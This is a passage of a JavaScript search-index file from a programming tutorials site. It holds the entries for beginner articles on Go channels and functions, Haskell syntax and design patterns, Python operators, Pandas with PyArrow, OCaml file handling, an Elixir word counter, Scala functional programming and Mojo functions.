                content: "Introduction:\nHello, Go enthusiasts! As we continue our journey into Go’s concurrency model, it’s essential to delve into one of its most significant components: channels. Channels in Go provide a powerful way for goroutines to communicate with each other. They help prevent common issues like race conditions and deadlocks that are typical in conventional multithreaded applications. In this blog, we’ll explore how to use channels to enable safe and efficient communication between goroutines, and we’ll differentiate between buffered and unbuffered channels. Additionally, we’ll learn how to manage multiple channel operations using the select statement, an indispensable tool in complex concurrent systems.\n1. Using Channels to Communicate Between Goroutines\nChannels are typed conduits through which you can send and receive values with the channel operator, \u003c-. To create a channel, you use the built-in make function:\nch := make(chan int) // unbuffered channel of integers a. Sending and Receiving Values:\nGoroutines can send values into channels and receive values from channels:\nfunc send(ch chan\u003c- int, value int) { ch \u003c- value // send value to channel } func receive(ch \u003c-chan int) { value := \u003c-ch // receive value from channel fmt.Println(\"Received:\", value) } func main() { ch := make(chan int) go send(ch, 3) go receive(ch) time.Sleep(1 * time.Second) // sleep to ensure goroutines complete } 2. Buffered and Unbuffered Channels\nChannels can be either buffered or unbuffered, affecting how send and receive operations behave.\na. Unbuffered Channels:\nAn unbuffered channel has no capacity to hold any values. Each send operation must be directly met with a corresponding receive operation, otherwise, the send will block until the receive is ready, and vice versa.\nb. Buffered Channels:\nA buffered channel has a capacity to store one or more values before needing a corresponding receiver. This can improve performance by allowing goroutines to send multiple values without blocking, up to the capacity of the channel.\nch := make(chan int, 2) // buffered channel with capacity of 2 ch \u003c- 1 // does not block ch \u003c- 2 // does not block fmt.Println(\u003c-ch) // outputs 1 fmt.Println(\u003c-ch) // outputs 2 3. Select Statement for Channel Operations\nThe select statement lets a goroutine wait on multiple communication operations. A select blocks until one of its cases can run, then it executes that case. It’s like a switch statement but for channels.\nfunc process(ch1, ch2 chan int) { for { select { case x := \u003c-ch1: fmt.Println(\"Received from ch1:\", x) case x := \u003c-ch2: fmt.Println(\"Received from ch2:\", x) case \u003c-time.After(1 * time.Minute): fmt.Println(\"No activity for 1 minute, exiting.\") return } } } func main() { ch1 := make(chan int) ch2 := make(chan int) go process(ch1, ch2) ch1 \u003c- 1 ch2 \u003c- 2 time.Sleep(2 * time.Second) // sleep to ensure the process function prints outputs } Conclusion:\nChannels are a cornerstone of Go’s approach to concurrency, providing a robust framework for handling asynchronous data exchange between goroutines. By using unbuffered or buffered channels and leveraging the select statement, you can design highly concurrent systems that are both efficient and easy to understand. As you continue to build with Go, remember that effective use of channels is key to creating scalable and maintainable concurrent applications.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: What happens if a channel is closed? A: Sending to a closed channel will cause a panic, while receiving from a closed channel will return the zero value immediately.\nQ: How do I close a channel? A: You can close a channel with the built-in close function. It’s important to ensure that no goroutine sends to a channel after it has been closed.\nQ: Can I select on a channel that’s closed? A: Yes, selecting on a closed channel will succeed immediately, making it useful for breaking out of a select loop in some scenarios.\n"
            }
        );
    index.add(
            {
                id:  112 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/functional-design-patterns-in-haskell\/",
                title: "Exploring Functional Design Patterns in Haskell",
                description: "Delve into Haskell's functional design patterns, including recursion, functors, applicative functors, and monoids. Understand how these patterns can enhance your functional programming skills.",
                content: "Introduction: linkWelcome back to our deep dive into Haskell’s capabilities. In this installment, we explore functional design patterns that are essential for effective Haskell programming. Functional programming patterns like recursion, functors, applicative functors, and monoids not only streamline code but also elevate its expressiveness and efficiency. This post will guide you through these patterns, showcasing how to leverage them for solving complex programming problems with elegance and clarity.\nRecursion and Recursive Data Structures linkUnderstanding Recursion in Haskell:\nRecursion is a fundamental concept in functional programming, where functions are defined in terms of themselves. Haskell excels in recursive definitions due to its pure functional nature, allowing for powerful and concise recursive functions and data structures.\nSimple Recursion Example:\nfactorial :: Integer -\u003e Integer factorial 0 = 1 factorial n = n * factorial (n - 1) Recursive Data Structures: Recursive data structures, such as lists and trees, are naturally expressed in Haskell. For instance, a binary tree can be defined recursively as either an empty tree or a node containing a value and two subtrees.\ndata BinaryTree a = Empty | Node a (BinaryTree a) (BinaryTree a) Functor and Applicative Functors linkFunctors in Haskell:\nA functor is a type class that encapsulates types that can be mapped over. In Haskell, the Functor type class is primarily used with containers and computational contexts.\nFunctor Definition:\nclass Functor f where fmap :: (a -\u003e b) -\u003e f a -\u003e f b Using fmap with Lists: Lists in Haskell are functors, and you can use fmap to apply a function to each element of a list.\nincrementAll :: [Int] -\u003e [Int] incrementAll = fmap (+1) Applicative Functors:\nApplicative functors build on functors by allowing functions wrapped in a context (such as a container) to be applied to values in a similar context.\nApplicative Functor Definition:\nclass Functor f =\u003e Applicative f where pure :: a -\u003e f a (\u003c*\u003e) :: f (a -\u003e b) -\u003e f a -\u003e f b Example Using Maybe:\nsafeDivide :: Double -\u003e Double -\u003e Maybe Double safeDivide _ 0 = Nothing safeDivide x y = Just (x / y) result = pure safeDivide \u003c*\u003e Just 10 \u003c*\u003e Just 2 -- Just 5.0 Monoids and Their Applications linkMonoids in Haskell:\nA monoid is an algebraic structure with a binary associative operation and an identity element. Monoids are useful in a wide range of scenarios from combining lists to aggregating data.\nMonoid Type Class:\nclass Monoid m where mempty :: m mappend :: m -\u003e m -\u003e m Using Monoids: Strings and lists are examples of monoids where the empty list or string acts as the identity element, and concatenation is the binary operation.\ncombinedList :: [Int] combinedList = [1, 2, 3] `mappend` [4, 5, 6] -- [1, 2, 3, 4, 5, 6] Conclusion: linkFunctional design patterns in Haskell provide a robust toolkit for solving programming challenges effectively. By understanding and applying recursion, functors, applicative functors, and monoids, you can create programs that are not only more expressive but also more efficient and maintainable. As you continue to explore Haskell, integrate these patterns into your development practices to see how they can transform your approach to functional programming.\nFrequently Asked Questions:\nQ: How can I choose the right functional pattern for a problem? **A: Analyze the problem\nto determine if it involves operations best described by one of the patterns—like recursion for repetitive tasks, functors for transformations, applicatives for operations in context, or monoids for aggregation.**\nQ: Can these patterns be combined? A: Yes, in practical Haskell programming, these patterns often interact. For example, you might use recursion with monoids to aggregate results from a tree structure.\n"
            }
        );
    index.add(
            {
                id:  113 ,
                href: "\/tutorials\/docs\/golang\/golang\/functions-in-go\/",
                title: "Exploring Functions in Go",
                description: "Delve into Go programming functions, including how to define and call them, manage parameters and multiple return values, and utilize anonymous functions and closures for advanced coding techniques.",
                content: "Introduction:\nWelcome back, Go developers! As we venture deeper into the world of Go programming, we reach one of the most fundamental aspects of any programming language: functions. Functions in Go are powerful and flexible, allowing you to write clean, maintainable, and reusable code. This blog will guide you through defining and calling functions, handling parameters and return values, and mastering anonymous functions and closures. Let’s jump into the mechanics and best practices of Go functions.\n1. Defining and Calling Functions\na. Defining Functions:\nIn Go, a function is defined using the func keyword, followed by the function’s name, a list of parameters (if any), the return type(s), and a body. Here’s the basic syntax:\nfunc functionName(param1 type1, param2 type2) returnType { // function body return value } Example:\nfunc add(a int, b int) int { return a + b } In this example, the add function takes two integers and returns their sum.\nb. Calling Functions:\nTo call a function, simply use the function name followed by arguments in parentheses:\nresult := add(5, 3) fmt.Println(\"The sum is:\", result) This will output: The sum is: 8.\n2. Parameters, Return Values, and Multiple Return Values\na. Parameters:\nFunctions can take zero or more parameters. Parameters are specified in the function signature, where each parameter is named and typed:\nfunc greet(name string) { fmt.Println(\"Hello\", name) } b. Return Values:\nFunctions can return one or more values. The return type is declared right after the parameter list:\nfunc divide(a int, b int) (int, error) { if b == 0 { return 0, fmt.Errorf(\"cannot divide by zero\") } return a / b, nil } c. Multiple Return Values:\nGo supports functions that return multiple values, which is particularly handy for returning a result along with an error, as seen in the divide example above.\n3. Anonymous Functions and Closures\na. Anonymous Functions:\nGo supports anonymous functions, which can be defined and called inline without needing a name. These are useful when you want to define a function without naming it, often for short-term use.\nExample:\nfunc() { fmt.Println(\"I'm an anonymous function!\") }() b. Closures:\nClosures are a special case of anonymous functions. A closure is an anonymous function that references variables from outside its body. The function can access and assign to the referenced variables; in this sense, the function is “bound” to the variables.\nExample:\nfunc outerFunction() func() string { greeting := \"Hello\" return func() string { greeting += \" world!\" return greeting } } func main() { helloWorld := outerFunction() fmt.Println(helloWorld()) // Outputs: Hello world! } In this example, helloWorld becomes a closure that contains both the function definition and the greeting variable it references.\nConclusion:\nFunctions are a critical part of Go programming, providing you the ability to write modular, reusable, and maintainable code. Whether you are defining regular functions with clear names and purposes, handling multiple return types, or leveraging the power of anonymous functions and closures for flexibility and expressiveness, Go’s functions are designed to meet your programming needs efficiently. As you continue to experiment with and explore functions, you’ll find that they are indispensable tools in your Go programming toolkit.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: What is the difference between parameters and arguments? A: Parameters are the variables listed in the function’s definition, whereas arguments are the actual values passed to the function when it is called.\nQ: How can I pass an unlimited number of values to a function? A: Go supports variadic functions, which can take an indefinite number of arguments. Use ... before the type name to denote a variadic function.\nQ: Can functions be passed as parameters to other functions? A: Yes, in Go, functions are first-class citizens, meaning they can be passed as arguments to other functions, returned as values from functions, and assigned to variables.\nKeep practicing and exploring the versatile features of functions in Go, and you’ll soon be crafting robust applications with ease!\n"
            }
        );
    index.add(
            {
                id:  114 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/exploring-haskell-syntax-basic-concepts\/",
                title: "Exploring Haskell Syntax and Basic Concepts",
                description: "Unravel the fundamentals of Haskell with a focus on expressions, types, type inference, and functions. This guide provides a clear introduction to Haskell’s syntax and basic programming concepts.",
                content: "Introduction:\nWelcome back to the fascinating world of Haskell, a language that redefines the boundaries of programming through its pure functional nature and strong static type system. In this post, we delve deeper into the syntax and foundational concepts of Haskell. This language’s focus on immutability, type safety, and function-driven solutions offers a distinct approach to solving programming challenges efficiently and effectively. By understanding Haskell’s expressions, variables, basic data types, and functions, you’ll be equipped to tackle more complex programming tasks with confidence.\n1. Understanding Expressions, Types, and Type Inference\nIn Haskell, everything you write is an expression, meaning that each piece of code evaluates to a value. This fundamental aspect influences how you approach programming tasks, focusing more on what to compute rather than how to compute it.\nExpressions: Haskell treats computations as evaluations of expressions rather than executions of instructions. For example, conditions in if-expressions evaluate to values, contrasting with if-statements in imperative languages that perform actions. result = if 5 \u003e 3 then \"Five is greater\" else \"Five is not greater\" Types: Haskell’s type system is designed to ensure correctness in your programs. Every expression in Haskell has a type, whether it’s a simple integer or a complex function. Haskell’s compiler uses type information to optimize and validate programs.\nType Inference: Haskell is renowned for its advanced type inference capabilities. You don’t need to explicitly annotate types in many cases because the compiler can infer them. This leads to cleaner and more concise code, as the compiler ensures type safety without verbose type declarations.\n-- Haskell can infer the type signature automatically sumNumbers x y = x + y 2. Variables, Immutability, and Basic Data Types\nHaskell enforces immutability strictly. Once a variable is defined, its value cannot be changed, which eliminates a whole class of bugs related to mutable state.\nVariables and Immutability: In Haskell, when you define a variable, you are making a permanent binding between a name and a value. This immutability is a key feature of functional programming, supporting predictable behavior and thread-safe operations without complex locking mechanisms. x = 10 -- x is always 10 in its scope, cannot be modified Basic Data Types: Haskell provides a range of basic data types which include:\nInt and Integer for integers (where Integer is unbounded) Float and Double for floating-point numbers Bool for boolean values (True or False) Char for characters and String for strings of characters 3. Functions: Syntax, Application, and Basic Examples\nFunctions are the core of Haskell programming. They are used not just for code reuse and modularity but also as fundamental building blocks of the language.\nSyntax and Application: Functions in Haskell are defined by specifying a name, a list of parameters, an equals sign, and the function body. Function application is simply writing the function name followed by its arguments, separated by spaces. -- Defining a simple function add a b = a + b -- Applying the function sum = add 5 7 -- sum will be 12 Basic Function Examples: Let’s define a simple function to multiply two numbers and another to determine if a number is even using Haskell’s concise syntax. -- Multiplies two numbers multiply x y = x * y -- Determines if a number is even isEven n = n `mod` 2 == 0 Conclusion:\nThis exploration of Haskell’s syntax and basic concepts provides a solid foundation for developing robust and efficient Haskell programs. By embracing Haskell’s paradigms of immutability, type safety, and pure function use, you’ll develop software that is not only correct by design but also exceptionally maintainable and scalable. As you continue your Haskell journey, remember that the strength of Haskell lies in its ability to express complex ideas in a clear and concise manner.\nFrequently Asked Questions:\nQ: How do I manage side effects in Haskell? A: Haskell handles side effects such as IO operations using monads, specifically the IO monad, which encapsulates actions that interact with the outside world.\nQ: Can Haskell be used for scripting? A: Yes, Haskell can be used for scripting tasks. Scripts can be written to automate tasks just like in any scripting language, leveraging Haskell’s strong type system and functional nature for robust script development.\n"
            }
        );
    index.add(
            {
                id:  115 ,
                href: "\/tutorials\/docs\/python\/python\/python_operators\/",
                title: "Exploring Python Operators: Arithmetic, Comparison, and Logical Operations",
                description: "Master the use of Python operators to manipulate values and control the flow of your programs. This comprehensive guide covers arithmetic, comparison, and logical operators with practical code examples.",
                content: "Introduction linkOperators in Python are special symbols that carry out arithmetic or logical computation. The value that the operator operates on is called the operand. In this guide, we’ll explore three major types of operators: arithmetic, comparison, and logical.\nArithmetic Operators linkArithmetic operators are used to perform mathematical operations like addition, subtraction, multiplication, and division.\nAddition (+): Adds two operands. Subtraction (-): Subtracts right operand from the left. Multiplication (*): Multiplies two operands. Division (/): Divides left operand by the right one (result is always a float). Floor Division (//): Divides and returns the integer value of the quotient. It dumps the digits after the decimal. Modulus (%): Divides left operand by the right and returns remainder. Exponentiation (**): Performs exponential (power) calculation on operators. Example:\nx = 15 y = 4 print('x + y =', x + y) # Output: 19 print('x - y =', x - y) # Output: 11 print('x * y =', x * y) # Output: 60 print('x / y =', x / y) # Output: 3.75 print('x // y =', x // y) # Output: 3 print('x % y =', x % y) # Output: 3 print('x ** y =', x ** y) # Output: 50625 Comparison Operators linkComparison operators are used to compare values. They return a Boolean value (either True or False).\nEqual to (==): True if both operands are equal. Not equal to (!=): True if operands are not equal. Greater than (\u003e): True if left operand is greater than the right. Less than (\u003c): True if left operand is less than the right. Greater than or equal to (\u003e=): True if left is greater than or equal to the right. Less than or equal to (\u003c=): True if left is less than or equal to the right. Example:\na = 10 b = 20 print('a == b is', a == b) # Output: False print('a != b is', a != b) # Output: True print('a \u003e b is', a \u003e b) # Output: False print('a \u003c b is', a \u003c b) # Output: True print('a \u003e= b is', a \u003e= 10) # Output: True print('a \u003c= b is', a \u003c= 20) # Output: True Logical Operators linkLogical operators are used to combine conditional statements.\nand: True if both operands are true. or: True if at least one of the operands is true. not: True if operand is false (complements the operand). Example:\nc = True d = False print('c and d is', c and d) # Output: False print('c or d is', c or d) # Output: True print('not c is', not c) # Output: False Conclusion linkOperators play a critical role in constructing expressions and making decisions in your programs. This guide has detailed the usage of arithmetic, comparison, and logical operators in Python with examples, helping you understand how to apply these concepts effectively in your coding tasks.\n"
            }
        );
    index.add(
            {
                id:  116 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/pandas_with_pyarrow\/",
                title: "Extending Pandas with PyArrow: Enhanced Functionality and Performance",
                description: "Pandas, the go-to data manipulation library in Python, can further extend its capabilities and improve performance by leveraging PyArrow. PyArrow provides a robust interface for working with Apache Arrow, a columnar in-memory data format optimized for analytics. In this blog, we’ll explore how Pandas integrates with PyArrow to offer more extensive data types, improved support for missing data, performant IO operations, and interoperability with other data frame libraries.\nPyArrow Functionality in Pandas linkPyArrow enhances Pandas’ functionality in several key areas:",
                content: "Pandas, the go-to data manipulation library in Python, can further extend its capabilities and improve performance by leveraging PyArrow. PyArrow provides a robust interface for working with Apache Arrow, a columnar in-memory data format optimized for analytics. In this blog, we’ll explore how Pandas integrates with PyArrow to offer more extensive data types, improved support for missing data, performant IO operations, and interoperability with other data frame libraries.\nPyArrow Functionality in Pandas linkPyArrow enhances Pandas’ functionality in several key areas:\nMore Extensive Data Types Compared to NumPy: PyArrow supports a broader range of data types, including more complex types such as decimal and map. Missing Data Support (NA) for All Data Types: Unlike NumPy, PyArrow provides consistent missing data (NA) support across all data types. Performant IO Reader Integration: PyArrow can significantly accelerate IO operations such as reading from CSV or JSON files. Interoperability with Other DataFrame Libraries: Based on the Apache Arrow specification, PyArrow facilitates seamless interoperability with other libraries like Polars and cuDF. Minimum Supported PyArrow Version linkTo take advantage of these features, ensure you have the minimum supported version of PyArrow installed. You can install PyArrow using pip:\npip install pyarrow Data Structure Integration linkCreating PyArrow-Backed Pandas Objects linkPandas allows you to create Series, Index, or DataFrame columns backed by PyArrow. This is achieved by specifying the data type using the dtype parameter.\nExample: Creating a Series with PyArrow link import pandas as pd ser = pd.Series([-1.5, 0.2, None], dtype=\"float32[pyarrow]\") print(ser) Output:\n0 -1.5 1 0.2 2 dtype: float[pyarrow] Example: Creating an Index with PyArrow link idx = pd.Index([True, None], dtype=\"bool[pyarrow]\") print(idx) Output:\nIndex([True, ], dtype='bool[pyarrow]') Example: Creating a DataFrame with PyArrow link df = pd.DataFrame([[1, 2], [3, 4]], dtype=\"uint64[pyarrow]\") print(df) Output:\n0 1 0 1 2 1 3 4 Differences Between string[pyarrow] and pd.ArrowDtype(pa.string()) linkThere are subtle differences between the string alias \"string[pyarrow]\" and specifying dtype=pd.ArrowDtype(pa.string()). Generally, operations on data will behave similarly, but some differences in return types exist.\nimport pyarrow as pa import pandas as pd data = list(\"abc\") ser_sd = pd.Series(data, dtype=\"string[pyarrow]\") ser_ad = pd.Series(data, dtype=pd.ArrowDtype(pa.string())) print(ser_ad.dtype == ser_sd.dtype) # Output: False print(ser_sd.str.contains(\"a\")) print(ser_ad.str.contains(\"a\")) Output:\nFalse 0 True 1 False 2 False dtype: boolean 0 True 1 False 2 False dtype: bool[pyarrow] Handling More Complex Data Types linkFor PyArrow types that accept parameters, you can pass a PyArrow type with those parameters into ArrowDtype.\nExample: List of Strings link list_str_type = pa.list_(pa.string()) ser = pd.Series([[\"hello\"], [\"there\"]], dtype=pd.ArrowDtype(list_str_type)) print(ser) Output:\n0 ['hello'] 1 ['there'] dtype: list[pyarrow] Example: Time and Decimal Types link from datetime import time from decimal import Decimal # Time Type time_type = pd.ArrowDtype(pa.time64(\"us\")) idx = pd.Index([time(12, 30), None], dtype=time_type) print(idx) # Decimal Type decimal_type = pd.ArrowDtype(pa.decimal128(3, scale=2)) data = [[Decimal(\"3.19\"), None], [None, Decimal(\"-1.23\")]] df = pd.DataFrame(data, dtype=decimal_type) print(df) Output:\nIndex([12:30:00, ], dtype='time64[us][pyarrow]') 0 1 0 3.19 1 -1.23 Working with PyArrow Arrays and ChunkedArrays linkIf you already have a PyArrow Array or ChunkedArray, you can construct the associated Pandas objects directly.\nExample: Creating a Series from a PyArrow Array link pa_array = pa.array([{\"1\": \"2\"}, {\"10\": \"20\"}, None], type=pa.map_(pa.string(), pa.string())) ser = pd.Series(pd.arrays.ArrowExtensionArray(pa_array)) print(ser) Output:\n0 [('1', '2')] 1 [('10', '20')] 2 dtype: map[pyarrow] Retrieving PyArrow Arrays from Pandas Objects linkYou can retrieve a PyArrow ChunkedArray from a Pandas Series or Index.\nExample: Retrieving PyArrow Array link ser = pd.Series([1, 2, None], dtype=\"uint8[pyarrow]\") print(pa.array(ser)) idx = pd.Index(ser) print(pa.array(idx)) Output:\n[ 1, 2, null ] [ 1, 2, null ] Converting a PyArrow Table to a DataFrame linkYou can convert a PyArrow Table to a Pandas DataFrame using the to_pandas() method.\nExample: Converting PyArrow Table link table = pa.table([pa.array([1, 2, 3], type=pa.int64())], names=[\"a\"]) df = table.to_pandas(types_mapper=pd.ArrowDtype) print(df) print(df.dtypes) Output:\na 0 1 1 2 2 3 a int64[pyarrow] dtype: object PyArrow-Accelerated Operations linkPandas integrates PyArrow to accelerate several operations, including numeric aggregations, arithmetic, logical operations, and more.\nExamples of Accelerated Operations link import pyarrow as pa ser = pd.Series([-1.545, 0.211, None], dtype=\"float32[pyarrow]\") print(ser.mean()) # Output: -0.6669999808073044 print(ser + ser) # Output: 0 -3.09, 1 0.422, 2 print(ser \u003e (ser + 1)) # Output: 0 False, 1 False, 2 print(ser.dropna()) # Output: 0 -1.545, 1 0.211 print(ser.isna()) # Output: 0 False, 1 False, 2 True print(ser.fillna(0)) # Output: 0 -1.545, 1 0.211, 2 0.0 String Operations link ser_str = pd.Series([\"a\", \"b\", None], dtype=pd.ArrowDtype(pa.string())) print(ser_str.str.startswith(\"a\")) Output:\n0 True 1 False 2 dtype: bool[pyarrow] Datetime Operations link from datetime import datetime pa_type = pd.ArrowDtype(pa.timestamp(\"ns\")) ser_dt = pd.Series([datetime(2022, 1, 1), None], dtype=pa_type) print(ser_dt.dt.strftime(\"%Y-%m\")) Output:\n0 2022-01 1 dtype: string[pyarrow] PyArrow-Accelerated IO Reading linkPyArrow can be used to speed up various IO operations in Pandas, such as reading from CSV or JSON files. You can specify the engine=\"pyarrow\" parameter to utilize PyArrow’s capabilities.\nExample: Reading CSV with PyArrow link import io data = io.StringIO(\"\"\"a,b,c 1,2.5,True 3,4.5,False \"\"\") df = pd.read_csv(data, engine=\"pyarrow\") print(df) Output:\na b c 0 1 2.5 True 1 3 4.5 False Returning PyArrow-Backed Data linkTo return PyArrow-backed data, use the dtype_backend=\"pyarrow\" parameter.\nExample: Returning PyArrow-Backed Data link data = io.StringIO(\"\"\"a,b,c,d,e,f,g,h,i 1 ,2.5,True,a,,,,, 3,4.5,False,b,6,7.5,True,a, \"\"\") df_pyarrow = pd.read_csv(data, dtype_backend=\"pyarrow\") print(df_pyarrow.dtypes) Output:\na int64[pyarrow] b double[pyarrow] c bool[pyarrow] d string[pyarrow] e int64[pyarrow] f double[pyarrow] g bool[pyarrow] h string[pyarrow] i null[pyarrow] dtype: object Conclusion linkIntegrating PyArrow with Pandas extends the library’s functionality, improves performance, and enables more complex data manipulations. By leveraging PyArrow, you can handle a wider range of data types, achieve better missing data support, and accelerate various operations and IO tasks. Ensure you have PyArrow installed and explore the enhanced capabilities it brings to your Pandas workflows.\n"
            }
        );
    index.add(
            {
                id:  117 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/file_manipulation\/",
                title: "File Manipulation in OCaml",
                description: "OCaml is a multi-paradigm programming language, an extension of the Caml language, and a member of the ML (Meta Language) family.",
                content: "File manipulation in OCaml revolves around the concept of channels, which are used for both reading from and writing to files. Here’s a breakdown of the basic file manipulation operations:\nWriting to a File linkTo write data into a file:\nOpen the File: Use functions like open_out or open_out_bin to obtain an output channel (out_channel). Write to the Channel: Use functions like Printf.fprintf to write data into the channel. Flush the Channel: If you want to ensure immediate writing to the physical device, call flush on the channel. Close the Channel: Use close_out or close_out_noerr to close the channel, which also flushes it automatically. Reading from a File linkTo read data from a file:\nOpen the File: Use functions like open_in or open_in_bin to obtain an input channel (in_channel). Read from the Channel: Use functions like input_line to read data from the channel. Handle End of File: When there are no more characters to read, the End_of_file exception is raised. Catch this exception and close the channel. Close the Channel: Use close_in or close_in_noerr to close the channel. Seeking linkYou can manipulate the current position within a file using seek_in or seek_out functions. This allows you to skip to a particular position or restart reading from the beginning.\nGotchas link Flush Output Channels: Remember to flush output channels to ensure data is written immediately. Close Unused Channels: Close any unused channels to avoid exceeding the operating system’s limit on open files. Use Correct Channels: Be mindful of using the correct channels, especially when dealing with standard channels like stdout, stdin, and stderr. Truncation with open_out: open_out truncates the file if it already exists. Use open_out_gen for alternate behavior. Example link let file = \"example.dat\" let message = \"Hello!\" let () = (* Write message to file *) let oc = open_out file in (* create or truncate file, return channel *) Printf.fprintf oc \"%s\\n\" message; (* write something *) close_out oc; (* flush and close the channel *) (* Read file and display the first line *) let ic = open_in file in try let line = input_line ic in (* read line, discard \\n *) print_endline line; (* write the result to stdout *) flush stdout; (* write on the underlying device now *) close_in ic (* close the input channel *) with e -\u003e (* some unexpected exception occurs *) close_in_noerr ic; (* emergency closing *) raise e (* exit with error: files are closed but channels are not flushed *) (* normal exit: all channels are flushed and closed *) Compilation and Execution link $ ocamlopt -o file_manip file_manip.ml $ ./file_manip Hello! This example demonstrates writing a message to a file and then reading the file to display its content.\n"
            }
        );
    index.add(
            {
                id:  118 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/word_count_tool\/",
                title: "File Word Counter",
                description: "Elixir is a process-oriented, functional programming language that runs on the Erlang virtual machine (BEAM). The language was influenced by Ruby. This inspiration can be seen and felt in Elixir’s ecosystem and tooling options. Elixir is known to be easy to learn and widely applicable within the software development industry.",
                content: "This tool will read a text file and count the number of words in it. This project is straightforward and a great way to practice file handling and basic string manipulation in Elixir. You can further adjust this tool to your usecase, like creating your own editor that will have a word count.\nHere’s an outline of what we’ll cover:\nOverview linkWe’ll create a CLI tool named word_counter that reads a specified text file and counts the number of words in it. This tool will help users quickly determine the word count of a given file.\nSetting Up the Project link Create a new Elixir project: mix new word_counter cd word_counter Reading the File linkCreate a module WordCounter in lib/word_counter.ex to handle file reading:\ndefmodule WordCounter do def read_file(file_path) do case File.read(file_path) do {:ok, content} -\u003e {:ok, content} {:error, reason} -\u003e {:error, reason} end end end Counting Words linkAdd a function to count words in the WordCounter module in lib/word_counter.ex:\ndefmodule WordCounter do def read_file(file_path) do case File.read(file_path) do {:ok, content} -\u003e {:ok, content} {:error, reason} -\u003e {:error, reason} end end def count_words(content) do content |\u003e String.split(~r/\\s+/) |\u003e length() end end Handling Command-line Arguments linkCreate a module WordCounter.CLI in lib/word_counter/cli.ex to handle command-line interaction:\ndefmodule WordCounter.CLI do def main(args) do case parse_args(args) do {:ok, file_path} -\u003e process_file(file_path) {:error, message} -\u003e IO.puts(message) end end defp parse_args([file_path]) when is_binary(file_path), do: {:ok, file_path} defp parse_args(_), do: {:error, \"Usage: word_counter \"} defp process_file(file_path) do case WordCounter.read_file(file_path) do {:ok, content} -\u003e word_count = WordCounter.count_words(content) IO.puts(\"The file contains #{word_count} words.\") {:error, reason} -\u003e IO.puts(\"Failed to read file: #{reason}\") end end end Modify the mix.exs file to set the escript options so that the project can be run as a standalone executable:\ndefmodule WordCounter.MixProject do use Mix.Project def project do [ app: :word_counter, version: \"0.1.0\", elixir: \"~\u003e 1.11\", start_permanent: Mix.env() == :prod, deps: deps(), escript: escript() ] end defp escript do [main_module: WordCounter.CLI] end defp deps do [] end end Running the program linkEven though we don’t have any dependencies in this project, it’s always a good idea to run this command to ensure everything is up-to-date:\nmix deps.get Now, running this command will produce and executable for the tool.\nmix escript.build After that, run the executable with the path to your file. For this case, simple create a file named demo.txt on your root project, and run the following command:\n./word_counter demo.txt You should see and output like:\nThe file contains 2 words. Conclusion linkYou’ve built a simple and useful CLI tool in Elixir that reads a text file and counts the number of words. This project demonstrates basic file handling, string manipulation, and command-line interaction in Elixir.\n"
            }
        );
    index.add(
            {
                id:  119 ,
                href: "\/tutorials\/docs\/full-stack-projects\/",
                title: "Full-Stack Projects",
                description: "All full stack projects handout",
                content: ""
            }
        );
    index.add(
            {
                id:  120 ,
                href: "\/tutorials\/docs\/scala\/scala\/functional_programming\/",
                title: "Functional Programming in Scala",
                description: "Scala Lang description",
                content: "Functional Programming in Scala linkScala’s support for functional programming (FP) emphasizes writing software by composing pure functions, avoiding shared state, mutable data, and side-effects.\nUnderstanding Functional Programming\nFunctional programming treats computation as the evaluation of mathematical functions. It emphasizes the use of immutable data and functions as first-class citizens.\nImmutable Collections: Scala provides a rich set of immutable collections, making code safer and easier to understand. Higher-Order Functions: Higher-order functions can take functions as parameters or return functions, and they are critical in FP. Immutable Collections\nScala provides several immutable collections:\nList: An immutable sequence.\nval numbers = List(1, 2, 3, 4, 5) Vector: An immutable indexed sequence.\nval vector = Vector(1, 2, 3, 4, 5) Map: An immutable map of key-value pairs.\nval map = Map(\"Alice\" -\u003e 25, \"Bob\" -\u003e 30) Higher-Order Functions\nScala’s higher-order functions include map, filter, and reduce.\nmap: Transforms each element in a collection.\nval doubled = numbers.map(_ * 2) filter: Returns elements of a collection that meet a condition.\nval evenNumbers = numbers.filter(_ % 2 == 0) reduce: Combines all elements of a collection using a binary function.\nval sum = numbers.reduce(_ + _) Code Example: Scala Functional Programming\nHere’s a Scala program demonstrating functional programming concepts:\nobject FunctionalApp { def main(args: Array[String]): Unit = { val numbers = List(1, 2, 3, 4, 5) val doubled = numbers.map(_ * 2) println(s\"Doubled Numbers: $doubled\") val evenNumbers = numbers.filter(_ % 2 == 0) println(s\"Even Numbers: $evenNumbers\") val sum = numbers.reduce(_ + _) println(s\"Sum of Numbers: $sum\") } } This program showcases the use of map, filter, and reduce functions on a list of numbers.\n"
            }
        );
    index.add(
            {
                id:  121 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/functions_in_mojo\/",
                title: "Functions in Mojo",
                description: "Mojo Lang description",
                content: "Function Declaration link In Mojo, functions can be declared using fn for strongly-typed, memory-safe behavior, or def for dynamic behavior similar to Python. However, Mojo’s support for keyword arguments is still a work in progress. Keyword Parameters Example: link fn foo[a: Int, b: Int = 42](): print(a, \"+\", b) foo[a=5]() // prints '5 + 42' foo[a=7, b=13]() // prints '7 + 13' foo[b=20, a=6]() // prints '6 + 20' Struct with Keyword Parameters link struct KwParamStruct[a: Int, msg: String = \"mojo\"]: fn __init__(inout self): print(msg, a) fn use_kw_params(): KwParamStruct[a=42]() // prints 'mojo 42' KwParamStruct[5, msg=\"hello\"]() // prints 'hello 5' KwParamStruct[msg=\"hello\", a=42]() // prints 'hello 42' Memory Management with Pointers linkExample of a Struct in Mojo with Pointers: link struct HeapArray: var data: Pointer[Int] var size: Int fn __init__(inout self, size: Int, val: Int): self.size = size self.data = Pointer[Int].alloc(self.size) for i in range(self.size): self.data.store(i, val) fn __del__(owned self): self.data.free() fn dump(self): print_no_newline(\"[\") for i in range(self.size): if i \u003e 0: print_no_newline(\", \") print_no_newline(self.data.load(i)) print(\"]\") Copying Objects linkImplementing a copy constructor (copyinit) allows for object copying without errors.\nstruct HeapArray: #... (previous code) fn __copyinit__(inout self, other: Self): self.size = other.size self.data = Pointer[Int].alloc(self.size) for i in 